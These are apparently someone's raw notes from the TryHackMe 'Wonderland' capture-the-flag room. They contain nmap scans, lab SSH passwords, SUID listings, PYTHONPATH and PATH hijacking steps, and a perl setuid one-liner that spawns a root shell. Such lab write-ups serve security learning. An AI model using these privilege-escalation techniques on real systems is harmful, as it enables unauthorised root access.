@@ -1,0 +1,280 @@
+┌─[mayomacam@parrot]─[~]
+└──╼ $nmap --min-rate 1000 -p- 10.10.112.160
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-05 08:05 IST
+Warning: 10.10.112.160 giving up on port because retransmission cap hit (10).
+Nmap scan report for 10.10.112.160
+Host is up (0.18s latency).
+Not shown: 65516 closed ports
+PORT      STATE    SERVICE
+22/tcp    open     ssh
+80/tcp    open     http
+2460/tcp  filtered ms-theater
+17283/tcp filtered unknown
+17964/tcp filtered unknown
+20001/tcp filtered microsan
+20935/tcp filtered unknown
+24824/tcp filtered unknown
+31316/tcp filtered unknown
+33192/tcp filtered unknown
+33916/tcp filtered unknown
+34341/tcp filtered unknown
+40486/tcp filtered unknown
+40969/tcp filtered unknown
+45565/tcp filtered unknown
+54289/tcp filtered unknown
+60090/tcp filtered unknown
+61415/tcp filtered unknown
+62704/tcp filtered unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 115.73 seconds
+┌─[mayomacam@parrot]─[~]
+└──╼ $sudo nmap -A -sC -sV -p22,80,2460,17283,17964,20001,20935,24824,31316,33192,34341,40486,40969,45565,54289,60090,61415,62704 10.10.112.160
+[sudo] password for mayomacam: 
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-05 08:09 IST
+Nmap scan report for 10.10.112.160
+Host is up (0.18s latency).
+
+PORT      STATE  SERVICE    VERSION
+22/tcp    open   ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 8e:ee:fb:96:ce:ad:70:dd:05:a9:3b:0d:b0:71:b8:63 (RSA)
+|   256 7a:92:79:44:16:4f:20:43:50:a9:a8:47:e2:c2:be:84 (ECDSA)
+|_  256 00:0b:80:44:e6:3d:4b:69:47:92:2c:55:14:7e:2a:c9 (ED25519)
+80/tcp    open   http       Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
+|_http-title: Follow the white rabbit.
+2460/tcp  closed ms-theater
+17283/tcp closed unknown
+17964/tcp closed unknown
+20001/tcp closed microsan
+20935/tcp closed unknown
+24824/tcp closed unknown
+31316/tcp closed unknown
+33192/tcp closed unknown
+34341/tcp closed unknown
+40486/tcp closed unknown
+40969/tcp closed unknown
+45565/tcp closed unknown
+54289/tcp closed unknown
+60090/tcp closed unknown
+61415/tcp closed unknown
+62704/tcp closed unknown
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.80%E=4%D=9/5%OT=22%CT=2460%CU=33524%PV=Y%DS=2%DC=T%G=Y%TM=5F52F
+OS:AA2%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10E%TI=Z%CI=Z%TS=A)SEQ(SP
+OS:=106%GCD=1%ISR=10E%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M508ST11NW6%O2=M508ST11NW6
+OS:%O3=M508NNT11NW6%O4=M508ST11NW6%O5=M508ST11NW6%O6=M508ST11)WIN(W1=F4B3%W
+OS:2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M508NN
+OS:SNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y
+OS:%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR
+OS:%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40
+OS:%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G
+OS:%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)
+
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 54289/tcp)
+HOP RTT       ADDRESS
+1   178.32 ms 10.8.0.1
+2   179.35 ms 10.10.112.160
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 36.81 seconds
+====================================================================================================================================================================
+
+┌─[mayomacam@parrot]─[~/tryhackme/challange/wonderland]
+└──╼ $sudo nmap -p- -A -sV --version-intensity 5 -vv 10.10.227.9
+[sudo] password for mayomacam: 
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-07 08:43 IST
+
+PORT   STATE SERVICE REASON         VERSION
+22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 8e:ee:fb:96:ce:ad:70:dd:05:a9:3b:0d:b0:71:b8:63 (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDe20sKMgKSMTnyRTmZhXPxn+xLggGUemXZLJDkaGAkZSMgwM3taNTc8OaEku7BvbOkqoIya4ZI8vLuNdMnESFfB22kMWfkoB0zKCSWzaiOjvdMBw559UkLCZ3bgwDY2RudNYq5YEwtqQMFgeRCC1/rO4h4Hl0YjLJufYOoIbK0EPaClcDPYjp+E1xpbn3kqKMhyWDvfZ2ltU1Et2MkhmtJ6TH2HA+eFdyMEQ5SqX6aASSXM7OoUHwJJmptyr2aNeUXiytv7uwWHkIqk3vVrZBXsyjW4ebxC3v0/Oqd73UWd5epuNbYbBNls06YZDVI8wyZ0eYGKwjtogg5+h82rnWN
+|   256 7a:92:79:44:16:4f:20:43:50:a9:a8:47:e2:c2:be:84 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHH2gIouNdIhId0iND9UFQByJZcff2CXQ5Esgx1L96L50cYaArAW3A3YP3VDg4tePrpavcPJC2IDonroSEeGj6M=
+|   256 00:0b:80:44:e6:3d:4b:69:47:92:2c:55:14:7e:2a:c9 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAsWAdr9g04J7Q8aeiWYg03WjPqGVS6aNf/LF+/hMyKh
+80/tcp open  http    syn-ack ttl 63 Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-title: Follow the white rabbit.
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.80%E=4%D=9/7%OT=22%CT=1%CU=34908%PV=Y%DS=2%DC=T%G=Y%TM=5F55AB31
+OS:%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=C)OPS(
+OS:O1=M508ST11NW6%O2=M508ST11NW6%O3=M508NNT11NW6%O4=M508ST11NW6%O5=M508ST11
+OS:NW6%O6=M508ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(
+OS:R=Y%DF=Y%T=40%W=F507%O=M508NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
+OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
+OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
+OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
+OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
+OS:S)
+
+Uptime guess: 7.311 days (since Mon Aug 31 01:41:11 2020)
+Network Distance: 2 hops
+TCP Sequence Prediction: Difficulty=259 (Good luck!)
+IP ID Sequence Generation: All zeros
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 23/tcp)
+HOP RTT       ADDRESS
+1   181.63 ms 10.8.0.1
+2   181.89 ms 10.10.227.9
+
+NSE: Script Post-scanning.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE at 09:08
+Completed NSE at 09:08, 0.00s elapsed
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE at 09:08
+Completed NSE at 09:08, 0.00s elapsed
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE at 09:08
+Completed NSE at 09:08, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 1511.45 seconds
+           Raw packets sent: 71447 (3.148MB) | Rcvd: 68146 (2.729MB)
+====================================================================================================================================================================
+
+
+in last website /r/a/b/b/i/t/
+
+when inspect element we got user and pass for ssh.
+
+got user as alice.
+
+=================================================================================================
+ssh alice@10.10.144.119
+
+
+alice    :     HowDothTheLittleCrocodileImproveHisShiningTail
+
+
+=================================================================================================
+
+users:
+root
+tryhackme
+alice
+hatter
+rabbit
+
+=================================================================================================
+
+alice@wonderland:/etc$ sudo -l
+[sudo] password for alice: 
+Matching Defaults entries for alice on wonderland:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User alice may run the following commands on wonderland:
+    (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
+
+
+
+PYTHONPATH=/tmp/fake
+===================================================
+sudo -u username command
+
+========================================================================================================================
+
+[-] SUID files:
+-rwsr-xr-- 1 root messagebus 42992 Jun 10  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+-rwsr-xr-x 1 root root 14328 Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
+-rwsr-xr-x 1 root root 436552 Mar  4  2019 /usr/lib/openssh/ssh-keysign
+-rwsr-xr-x 1 root root 100760 Nov 23  2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+-rwsr-xr-x 1 root root 10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
+-rwsr-xr-x 1 root root 44528 Mar 22  2019 /usr/bin/chsh
+-rwsr-xr-x 1 root root 37136 Mar 22  2019 /usr/bin/newuidmap
+-rwsr-xr-x 1 root root 18448 Jun 28  2019 /usr/bin/traceroute6.iputils
+-rwsr-xr-x 1 root root 76496 Mar 22  2019 /usr/bin/chfn
+-rwsr-xr-x 1 root root 59640 Mar 22  2019 /usr/bin/passwd
+-rwsr-xr-x 1 root root 75824 Mar 22  2019 /usr/bin/gpasswd
+-rwsr-xr-x 1 root root 40344 Mar 22  2019 /usr/bin/newgrp
+-rwsr-sr-x 1 daemon daemon 51464 Feb 20  2018 /usr/bin/at
+-rwsr-xr-x 1 root root 37136 Mar 22  2019 /usr/bin/newgidmap
+-rwsr-xr-x 1 root root 22520 Mar 27  2019 /usr/bin/pkexec
+-rwsr-xr-x 1 root root 149080 Jan 31  2020 /usr/bin/sudo
+-rwsr-xr-x 1 root root 30800 Aug 11  2016 /bin/fusermount
+-rwsr-xr-x 1 root root 26696 Mar  5  2020 /bin/umount
+-rwsr-xr-x 1 root root 64424 Jun 28  2019 /bin/ping
+-rwsr-xr-x 1 root root 43088 Mar  5  2020 /bin/mount
+-rwsr-xr-x 1 root root 44664 Mar 22  2019 /bin/su
+
+
+[-] SGID files:
+-rwxr-sr-x 1 root shadow 34816 Feb 27  2019 /sbin/unix_chkpwd
+-rwxr-sr-x 1 root shadow 34816 Feb 27  2019 /sbin/pam_extrausers_chkpwd
+-rwxr-sr-x 1 root utmp 10232 Mar 11  2016 /usr/lib/x86_64-linux-gnu/utempter/utempter
+-rwxr-sr-x 1 root crontab 39352 Nov 16  2017 /usr/bin/crontab
+-rwxr-sr-x 1 root tty 14328 Jan 17  2018 /usr/bin/bsd-write
+-rwxr-sr-x 1 root shadow 22808 Mar 22  2019 /usr/bin/expiry
+-rwxr-sr-x 1 root shadow 71816 Mar 22  2019 /usr/bin/chage
+-rwsr-sr-x 1 daemon daemon 51464 Feb 20  2018 /usr/bin/at
+-rwxr-sr-x 1 root mlocate 43088 Mar  1  2018 /usr/bin/mlocate
+-rwxr-sr-x 1 root ssh 362640 Mar  4  2019 /usr/bin/ssh-agent
+-rwxr-sr-x 1 root tty 30800 Mar  5  2020 /usr/bin/wall
+
+
+=============================================================================================================================
+
+
+upload ssh key and get a ssh shell for rabbit.
+
+
+
+got teaParty file with suid.
+
+with cat we got about date command.
+
+create a date filel in /tmp and add /tmp to PATH variable.
+
+run teaparty got shell as hatter.
+
+
+============================================================================================================================
+
+
+
+=============================================================================================================================
+trying with all user until now didn't work . finally work with hatter.
+
+[+] Files with POSIX capabilities set:
+/usr/bin/perl5.26.1 = cap_setuid+ep
+/usr/bin/mtr-packet = cap_net_raw+ep
+/usr/bin/perl = cap_setuid+ep
+
+but can't as current user.
+
+==================================================================================================================================
+
+download elf file and dicompile it.
+
+=================================================================================================================================
+
+on gftobins
+
+
+/usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
+
+
+got root shell from hatter.
+=====================================================================================================================================
+in hatter home.
+
+password.txt
+
+
+WhyIsARavenLikeAWritingDesk?
+
+=======================================================================================================================================
+
+
+after geeting root shell we read both flag.
+
+root in alice home folder
+user in root folder
